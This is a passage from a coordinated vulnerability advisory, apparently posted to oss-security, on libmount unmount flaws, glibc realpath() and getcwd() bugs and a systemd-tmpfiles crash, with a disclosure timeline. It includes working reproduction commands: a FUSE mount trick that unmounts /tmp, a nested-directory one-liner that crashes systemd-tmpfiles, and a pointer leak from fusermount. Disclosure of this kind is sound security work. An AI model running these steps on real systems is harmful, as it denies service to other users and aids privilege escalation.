 469             strncmp(type, "fuseblk.", 8) !=3D 0)
 470                 return 0;
 ...
 477         if (mnt_optstr_get_option(optstr, "user_id", &user_id, &sz) !=
=3D 0)
 478                 return 0;
 ...
 490         uid =3D getuid();
 ...
 497         snprintf(uidstr, sizeof(uidstr), "%lu", (unsigned long) uid);
 498         return strncmp(user_id, uidstr, sz) =3D=3D 0;
 499 }
------------------------------------------------------------------------

Unfortunately, when parsing /proc/self/mountinfo, the libmount blindly
removes any " (deleted)" suffix from the mountpoint pathnames (at lines
231-233):

------------------------------------------------------------------------
 17 #define PATH_DELETED_SUFFIX     " (deleted)"
------------------------------------------------------------------------
 179 static int mnt_parse_mountinfo_line(struct libmnt_fs *fs, const char *=
s)
 180 {
 ...
 223         /* (5) target */
 224         fs->target =3D unmangle(s, &s);
 ...
 231         p =3D (char *) endswith(fs->target, PATH_DELETED_SUFFIX);
 232         if (p && *p)
 233                 *p =3D '\0';
------------------------------------------------------------------------

This vulnerability allows an unprivileged user to unmount other users'
filesystems that are either world-writable themselves (like /tmp) or
mounted in a world-writable directory (like /tmp/snap.rootfs_XXXXXX).
For example, on Fedora, /tmp is a tmpfs, so we can mount a basic FUSE
filesystem named "/tmp/ (deleted)" (with FUSE's "hello world" program,
./hello) and unmount /tmp itself (a denial of service):

------------------------------------------------------------------------
$ id
uid=3D1000(john) gid=3D1000(john) groups=3D1000(john) context=3Dunconfined_=
u:unconfined_r:unconfined_t:s0-s0:c0.c1023

$ grep /tmp /proc/self/mountinfo
84 87 0:34 / /tmp rw,nosuid,nodev shared:38 - tmpfs tmpfs rw,seclabel,size=
=3D2004304k,nr_inodes=3D409600,inode64

$ mkdir -m 0700 /tmp/" (deleted)"
$ ./hello /tmp/" (deleted)"

$ grep /tmp /proc/self/mountinfo
84 87 0:34 / /tmp rw,nosuid,nodev shared:38 - tmpfs tmpfs rw,seclabel,size=
=3D2004304k,nr_inodes=3D409600,inode64
620 84 0:46 / /tmp/\040(deleted) rw,nosuid,nodev,relatime shared:348 - fuse=
.hello hello rw,user_id=3D1000,group_id=3D1000

$ mount | grep /tmp
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,seclabel,size=3D2004304k,nr_inode=
s=3D409600,inode64)
/home/john/hello on /tmp/ type fuse.hello (rw,nosuid,nodev,relatime,user_id=
=3D1000,group_id=3D1000)

$ umount -l /tmp/
$ grep /tmp /proc/self/mountinfo | wc
      0       0       0
------------------------------------------------------------------------



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2021-3995: Unauthorized unmount in util-linux's libmount
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Alert readers may have spotted another vulnerability in
is_fuse_usermount(): at line 498, only the first "sz" characters of the
current user's uid are compared to the filesystem's "user_id" option (sz
is user_id's length). This second vulnerability allows an unprivileged
user to unmount the FUSE filesystems that belong to certain other users;
for example, if our own uid is 1000, then we can unmount the FUSE
filesystems of the users whose uid is 100, 10, or 1:

------------------------------------------------------------------------
$ id
uid=3D1000(john) gid=3D1000(john) groups=3D1000(john) context=3Dunconfined_=
u:unconfined_r:unconfined_t:s0-s0:c0.c1023

$ grep fuse /proc/self/mountinfo
38 23 0:32 / /sys/fs/fuse/connections rw,nosuid,nodev,noexec,relatime share=
d:18 - fusectl fusectl rw
620 87 0:46 / /mnt/bin rw,nosuid,nodev,relatime shared:348 - fuse.hello hel=
lo rw,user_id=3D1,group_id=3D1

$ umount -l /mnt/bin
$ grep fuse /proc/self/mountinfo
38 23 0:32 / /sys/fs/fuse/connections rw,nosuid,nodev,noexec,relatime share=
d:18 - fusectl fusectl rw
------------------------------------------------------------------------



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Epilogue: snap-confine and CVE-2021-3996 in util-linux's libmount
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

CVE-2021-3996 in libmount allows us to unmount the private bind-mount
of snap-confine's scratch directory, between the lines 245 and 254 (we
can reliably win this race condition by "single-stepping" snap-confine
with SNAPD_DEBUG=3D1), which allows us to execute the bind-mounted program
/tmp/snap.rootfs_XXXXXX/usr/lib/snapd/snap-confine. Nonetheless, we were
unable to reproduce our exploit for CVE-2021-44730 or CVE-2021-44731:

- if we execute snap-confine outside the snap's mount namespace, via
  /tmp/snap.rootfs_XXXXXX/usr/lib/snapd/snap-confine, then we are unable
  to provide our own snap-discard-ns program because the directory
  /tmp/snap.rootfs_XXXXXX already exists and we cannot remove it;

- if we execute snap-confine inside the snap's mount namespace, via
  /var/lib/snapd/hostfs/tmp/snap.rootfs_XXXXXX/usr/lib/snapd/snap-confine,
  then snap-confine enters init's mount namespace (outside the snap's
  mount namespace) and we are unable to provide our own snap-discard-ns
  program because the directory /var/lib/snapd/hostfs/tmp does not exist
  and we cannot create it.

If you, dear reader, find a solution to these problems, please post it
to the public oss-security mailing list!

Note: CVE-2021-3996 might be exploitable in contexts other than
snap-confine, but we have not explored this possibility.



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2021-3998: Unexpected return value from glibc's realpath()
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    Triple Trouble
        -- Lemmings, Taxing Level 26

While auditing umount and fusermount, we also discovered a vulnerability
in the glibc's realpath() function, which is used internally by various
programs. Normally, when the output buffer "resolved" that is passed to
realpath() is not NULL, then realpath() either returns NULL on failure,
or it returns the output buffer "resolved" on success. Unfortunately,
since commit c6e0b0b ("stdlib: Sync canonicalize with gnulib") from
January 2021, realpath() can mistakenly return a malloc()ated buffer
that is neither NULL nor the output buffer "resolved":

------------------------------------------------------------------------
430 char *
431 __realpath (const char *name, char *resolved)
432 {
...
437   struct scratch_buffer rname_buffer;
438   return realpath_stk (name, resolved, &rname_buffer);
439 }
------------------------------------------------------------------------
197 static char *
198 realpath_stk (const char *name, char *resolved,
199               struct scratch_buffer *rname_buf)
200 {
...
399   failed =3D false;
...
403   if (resolved !=3D NULL && dest - rname <=3D get_path_max ())
404     rname =3D strcpy (resolved, rname);
...
410   if (failed || rname =3D=3D resolved)
411     {
412       scratch_buffer_free (rname_buf);
413       return failed ? NULL : resolved;
414     }
415=20
416   return scratch_buffer_dupfree (rname_buf, dest - rname);
417 }
------------------------------------------------------------------------

For example, if the input path "name" is "." and if the current working
directory is longer than PATH_MAX, then:

- at line 399, "failed" is set to false;

- at lines 403-404, "rname" is NOT set to "resolved" and "resolved" is
  left untouched and uninitialized (because "dest - rname" is longer
  than PATH_MAX);

- the code block at lines 410-414 is skipped (because "failed" is false
  and "rname" is not "resolved");

- at line 416, scratch_buffer_dupfree() returns a malloc()ated buffer
  that is NOT the output buffer "resolved".

The consequences of this vulnerability depend on the affected programs;
for example, fusermount (a SUID-root program) can disclose sensitive
information (pointers) when displaying the contents of a stack-based
buffer that is mistakenly left uninitialized by realpath() (we tested
this proof of concept on Ubuntu 21.04):

------------------------------------------------------------------------
$ gcc -o CVE-2021-3998-fusermount CVE-2021-3998-fusermount.c
$ ./CVE-2021-3998-fusermount > CVE-2021-3998-fusermount.output
...

$ hexdump -C CVE-2021-3998-fusermount.output
00000000  2f 75 73 72 2f 62 69 6e  2f 66 75 73 65 72 6d 6f  |/usr/bin/fuser=
mo|
00000010  75 6e 74 3a 20 65 6e 74  72 79 20 66 6f 72 20 f0  |unt: entry for=
 .|
00000020  83 9b 99 ff 7f 20 6e 6f  74 20 66 6f 75 6e 64 20  |..... not foun=
d |
00000030  69 6e 20 2f 65 74 63 2f  6d 74 61 62 0a 0a 2f 75  |in /etc/mtab..=
/u|
00000040  73 72 2f 62 69 6e 2f 66  75 73 65 72 6d 6f 75 6e  |sr/bin/fusermo=
un|
00000050  74 3a 20 65 6e 74 72 79  20 66 6f 72 20 39 ac b7  |t: entry for 9=
..|
00000060  a5 a2 7f 20 6e 6f 74 20  66 6f 75 6e 64 20 69 6e  |... not found =
in|
00000070  20 2f 65 74 63 2f 6d 74  61 62 0a 0a              | /etc/mtab..|
------------------------------------------------------------------------



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2021-3999: Off-by-one buffer overflow/underflow in glibc's getcwd()
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    Down, along, up. In that order
        -- Lemmings, Mayhem Level 5

While studying the vulnerability in realpath(), we also discovered a
vulnerability in the glibc's getcwd() function (which is used internally
by realpath() to resolve relative pathnames) -- an off-by-one buffer
overflow and underflow, but if and only if the "size" of "buf" is
exactly 1:

------------------------------------------------------------------------
 48 __getcwd (char *buf, size_t size)
 49 {
 ..
 54   size_t alloc_size =3D size;
 ..
 76     path =3D buf;
 ..
 80   retval =3D INLINE_SYSCALL (getcwd, 2, path, alloc_size);
...
100   if (retval >=3D 0 || errno =3D=3D ENAMETOOLONG)
101     {
...
110       result =3D __getcwd_generic (path, size);
------------------------------------------------------------------------
158 __getcwd_generic (char *buf, size_t size)
159 {
...
187   size_t allocated =3D size;
...
247     dir =3D buf;
248=20
249   dirp =3D dir + allocated;
250   *--dirp =3D '\0';
...
262   while (!(thisdev =3D=3D rootdev && thisino =3D=3D rootino))
263     {
...
441     }
...
449   if (dirp =3D=3D &dir[allocated - 1])
450     *--dirp =3D '/';
...
457   used =3D dir + allocated - dirp;
458   memmove (dir, dirp, used);
------------------------------------------------------------------------

If, at line 48, the "size" of "buf" is exactly 1:

- and if, at line 80, the kernel's getcwd() syscall fails with the error
  ENAMETOOLONG (because the current working directory is longer than
  PATH_MAX),

- then, at line 110, a generic implementation of getcwd() is called;

- at line 250, a null byte is written to "dirp", which points exactly to
  "buf" (because "size", and hence "allocated", are exactly 1);

- if the code block at lines 262-441 is skipped entirely (if the current
  working directory corresponds to the "/" directory),

- then, at lines 449-450, a slash is written to "buf-1" (an off-by-one
  buffer underflow, because at line 449 "dirp" was still pointing
  exactly to "buf"),

- and, at lines 457-458, a null byte is written to "buf+1" (an
  off-by-one buffer overflow, because at line 457 "used" is exactly 2).

It may seem impossible to satisfy the condition at line 100 (the current
working directory is longer than PATH_MAX) and the condition at line 262
(the current working directory corresponds to the "/" directory), but in
reality we can:

- in a child process:

  - create an unprivileged mount namespace;

  - create a directory longer than PATH_MAX;

  - bind-mount "/" onto this directory;

  - open() this directory and send its file descriptor to the parent
    process (outside the unprivileged mount namespace);

- in the parent process:

  - receive the file descriptor of this directory (which corresponds to
    "/" and is longer than PATH_MAX) and fchdir() to it;

  - execute a SUID program that calls getcwd() with a buffer of size 1,
    which triggers the off-by-one buffer overflow and underflow.

Apparently, this vulnerability was introduced in February 1995 by the
very first commit in the glibc's git history (28f540f, "initial import")
and could be triggered without an unprivileged mount namespace, by
simply chdir()ing to the "/" directory:

------------------------------------------------------------------------
190 getcwd (buf, size)
...
218     path =3D buf;
...
226   pathp =3D path + size;
227   *--pathp =3D '\0';
...
242   while (!(thisdev =3D=3D rootdev && thisino =3D=3D rootino))
243     {
...
351     }
352=20
353   if (pathp =3D=3D &path[size - 1])
354     *--pathp =3D '/';
...
359   memmove (path, pathp, path + size - pathp);
------------------------------------------------------------------------

Although "the size of buf is exactly 1" is a strong requirement,
vulnerable code like the following may exist in the wild:

------------------------------------------------------------------------
#include <unistd.h>
#include <stdio.h>

int main(int argc, char * argv[]) {
    char buf[4096];
    int len =3D snprintf(buf, sizeof(buf), "%s: cwd is ", argv[0]);
    if (len <=3D 0 || (unsigned)len >=3D sizeof(buf)) return __LINE__;
    if (!getcwd(buf + len, sizeof(buf) - len)) return __LINE__;
    puts(buf);
    return 0;
}
------------------------------------------------------------------------



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
CVE-2021-3997: Uncontrolled recursion in systemd's systemd-tmpfiles
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    The Stack
        -- Oh No! More Lemmings, Crazy Level 6

While trying to exploit snap-confine via CVE-2021-3996, we explored
alternative ways to remove the scratch directory /tmp/snap.rootfs_XXXXXX
(a sufficient, and maybe necessary, condition for a successful exploit).
We therefore looked into systemd-tmpfiles (which "creates, deletes, and
cleans up volatile and temporary files and directories") and discovered
a denial of service (an uncontrolled recursion): if we create thousands
of nested directories in /tmp, then "systemd-tmpfiles --remove" (when
executed as root at boot time) will call its rm_rf_children() function
recursively (on each nested directory) and will exhaust its stack and
crash. For example, on Ubuntu 21.04:

------------------------------------------------------------------------
$ cd /tmp
$ perl -e 'use strict;
for (my $i =3D 0; $i < (1<<15); $i++) {
mkdir "A", 0700 or die;
chdir "A" or die; }'
------------------------------------------------------------------------

Then, as root (warning: this command may delete important files and
directories in /tmp; it is normally executed at boot time only):

------------------------------------------------------------------------
# systemd-tmpfiles --remove
Segmentation fault (core dumped)
------------------------------------------------------------------------

We have not fully explored the implications of this vulnerability;
however, we noticed that:

- at boot time, systemd executes "systemd-tmpfiles --create --remove
  --boot --exclude-prefix=3D/dev";

- systemd-tmpfiles first enters the "remove" phase, and subsequently
  enters the "create" phase;

- but if systemd-tmpfiles crashes during the "remove" phase, then it
  never enters the "create" phase;

- and it fails to create the files and directories (specified in
  /usr/lib/tmpfiles.d/*.conf) that it should create at boot time;

- for example, on Ubuntu 21.04, systemd-tmpfiles fails to create the
  directory /run/lock/subsys; but because /run/lock is world-writable,
  attackers can create their own /run/lock/subsys; and because various
  legacy packages and daemons write into /run/lock/subsys as root, the
  attackers may create arbitrary files via symlinks in /run/lock/subsys.

Last-minute note: it seems impossible to trigger this vulnerability in
systemd-tmpfiles versions before commit e535840 ("tmpfiles: let's bump
RLIMIT_NOFILE for tmpfiles") from February 2019.



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We thank the Ubuntu Security Team (Alex Murray and Seth Arnold in
particular) for their hard work on the snap-confine vulnerabilities. We
also thank Red Hat Product Security, Zbigniew Jedrzejewski-Szmek, Karel
Zak, Siddhesh Poyarekar, and the members of linux-distros@openwall for
their work on the systemd, util-linux, and glibc vulnerabilities.

This advisory is dedicated to 8lgm -- followers of symbolic links,
overflowers of stack buffers, and dereferencers of NULL pointers:

https://attrition.org/security/advisory/8lgm/
https://web.archive.org/web/20081203221844/packetstorm.linuxsecurity.com/po=
isonpen/8lgm/ptchown.c



=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2021-10-27: We sent our advisory and proofs-of-concepts to
security@ubuntu.

2021-11-10: We sent our advisory and proofs-of-concepts (without the
snap-confine vulnerabilities) to secalert@redhat.

2021-12-29: We sent a write-up and the patch for the systemd
vulnerability to linux-distros@openwall.

2022-01-10: We published our write-up on the systemd vulnerability
(https://www.openwall.com/lists/oss-security/2022/01/10/2).

2022-01-12: Red Hat filed the glibc vulnerabilities upstream
(https://sourceware.org/bugzilla/show_bug.cgi?id=3D28769 and
https://sourceware.org/bugzilla/show_bug.cgi?id=3D28770).

2022-01-20: We sent a write-up and the patches for the util-linux
vulnerabilities to linux-distros@openwall.

2022-01-24: We published our write-up on the util-linux vulnerabilities
(https://www.openwall.com/lists/oss-security/2022/01/24/2).

2022-01-24: We published our write-up on the glibc vulnerabilities
(https://www.openwall.com/lists/oss-security/2022/01/24/4).

2022-02-03: We sent our advisory and Ubuntu sent their patches for the
snap-confine vulnerabilities to linux-distros@openwall.

2022-02-17: Coordinated Release Date (5:00 PM UTC) for the snap-confine
vulnerabilities.
